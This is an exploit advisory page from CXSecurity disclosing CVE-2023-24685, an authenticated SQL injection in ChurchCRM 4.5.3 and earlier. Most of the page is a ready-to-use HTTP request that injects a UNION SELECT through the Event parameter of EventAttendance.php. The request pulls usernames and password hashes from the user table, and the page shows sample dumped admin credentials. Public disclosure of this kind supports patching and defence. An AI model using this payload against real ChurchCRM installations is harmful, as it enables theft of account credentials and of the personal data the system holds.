---
title: ChurchCRM 4.5.3 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023050008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:45.902931
---

# ChurchCRM 4.5.3 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ChurchCRM 4.5.3 SQL Injection** **2023.05.03**  Credit:  **[Iyaad Luqman K](https://cxsecurity.com/author/Iyaad%2BLuqman%2BK/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-24685](https://cxsecurity.com/cveshow/CVE-2023-24685/ "Click to see CVE-2023-24685")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: ChurchCRM 4.5.3 - Authenticated SQL Injection
# Date: 27-04-2023
# Exploit Author: Iyaad Luqman K
# Software Link: https://github.com/ChurchCRM/CRM/releases
# Vendor Homepage: http://churchcrm.io/
# Version: 4.5.3
# Tested on: Windows, Linux
# CVE: CVE-2023-24685
ChurchCRM v4.5.3 and below was discovered to contain a SQL injection vulnerability via the Event parameter
under the Event Attendance reports module.
- After Logging in, go to
```
GET /EventAttendance.php?Action=List&Event=2+UNION+ALL+SELECT+1,NULL,CONCAT(%27Perseverance%27,usr\_Username,%27:%27,usr\_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user\_usr--+-&Type=Sunday%20School HTTP/1.1
Host: localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CRM-7bf048c51cd7d0923f0ab3e959c3d3f6=d99fjb19f2kp081ol95remfm6d
Connection: close
```
- The response will dump the `usr\_Username` and `usr\_Password` from the database.
```
PerseveranceAdmin:261f4aef6877ce6c11a780ae6c13e4e2f27a8a55f69d6d6785fc787063272db4
```

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top